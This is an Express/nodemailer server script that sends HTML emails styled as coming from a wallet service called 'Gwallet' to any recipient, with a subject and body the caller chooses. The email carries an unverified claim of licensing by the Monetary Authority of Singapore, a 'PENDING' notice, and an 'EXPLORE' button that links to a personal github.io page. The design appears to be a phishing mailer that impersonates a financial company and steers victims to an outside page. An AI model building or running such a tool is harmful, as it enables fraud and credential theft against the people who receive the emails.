const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000; // Render provides the PORT environment variable

// Middleware
app.use(cors());
app.use(express.json());

// Serve static files from React/Vue/HTML frontend if you have one
app.use(express.static(path.join(__dirname, 'public')));

// API Routes
app.get('/api/data', (req, res) => {
    res.json({ message: 'Hello from Render server!' });
});

// API endpoint to send email
app.post('/api/data', (req, res) => {
  const { to, name, maintext, subject } = req.body; // Get recipient email from frontend

  // Validate email
  if (!to || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(to)) {
    return res.status(400).json({ error: 'Invalid email address' });
  }

    // Sanitize name; use default if not provided
  const sanitizedName = name && name.trim() ? name.trim() : 'Subscriber';

    //Maintext paragraph alternative
    const paragraph = maintext || 'apple breeze cloud dancer echo flicker grove harbor ink jolt kite lemon mist nova orbit pulse quartz ridge spark tide umbrella valley whisper xylem yarn zest amber bluff cedar dawn ember frost glint haze ivy jinx'; 

// Nodemailer transporter configuration
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER, 
    pass: process.env.EMAIL_PASS 
  },
});

  // Email options
  const mailOptions = {
    from: `"Gwallet" <${process.env.EMAIL_USER}>`,
    to: to, // Recipient email from frontend
    subject: `${subject}`,
    text: `Hello ${sanitizedName}!\n\nThank you for subscribing! This email contains updates and images in HTML format, but your email client is displaying the plain-text version. Visit our website for more information: https://x.com`,
    html: `
  <div style="text-align: center; background-color: #f1f7f7; max-width: 500px; margin: 0 auto; padding: 20px;">
          <div style="text-align: center;">
              <p style="width: 30px; height: 30px; border-radius: 50%; display: inline-block; font-size: 12px; background-color: #4CAF50; padding: 0 8px; border: 2px solid white;"></p>
              <p style="width: 30px; height: 30px; border-radius: 50%; display: inline-block; font-size: 12px; background-color: #4CAF50; padding: 0 8px; border: 2px solid white;"></p>
              <p style="width: 30px; height: 30px; border-radius: 50%; display: inline-block; font-size: 12px; background-color: #4CAF50; padding: 0 8px; border: 2px solid white;"></p>
              <h3 style="font-size: 12px; font-family: Arial, Helvetica, sans-serif; font-weight: bold; color: #4CAF50; margin: 0 auto;">GWallet</h3>
          </div>
          <h1 style="font-size: 32px; margin-bottom: 20px;">Hello ${sanitizedName}</h1>
          <p>PENDING<br>${maintext}</p>
          <a href="https://millxore.github.io/seen/" style="display: inline-block; color: #ffffff; padding: 15px 40px; background-color: #4CAF50; color: white; text-decoration: none; border-radius: 20px; font-size: 16px; margin: 10px 0; font-weight: bold;">EXPLORE</a>
      </div>
      <div style="background-color: #f1f7f7; max-width: 500px; margin: 0 auto; padding: 20px;">
          <div style="text-align: center;">
              <hr style="margin: 30px auto; border: 1px solid #D3D3D3;">
          </div>
          <div style="text-align: center;">
              <p style="display: inline-block; font-size: 12px; color: #4CAF50; padding: 0 8px;">Reliable</p>
              <p style="display: inline-block; font-size: 12px; color: #4CAF50; padding: 0 8px;">Fast</p>
              <p style="display: inline-block; font-size: 12px; color: #4CAF50; padding: 0 8px;">Easy</p>
          </div>
          <p style="color: #555; font-size: 14px;">
              For more info, visit our website!
          </p>
          <p style="color: #555; font-size: 14px;">
              Copyright © 1999-2025. All rights reserved. 
          </p>
          <p style="color: #555; font-size: 14px;">
              Rts. Ltd. is licensed by the Monetary Authority of Singapore as a Major Payment Institution under the Payment Services Act 2019.  
          </p>
      </div>
`
  };

  // Send email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('Error sending email:', error);
      return res.status(500).json({ error: 'Failed to send email' });
    }
    console.log('Email sent:', info.response);
    res.status(200).json({ message: 'Email sent successfully' });
  });
});

// Start server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
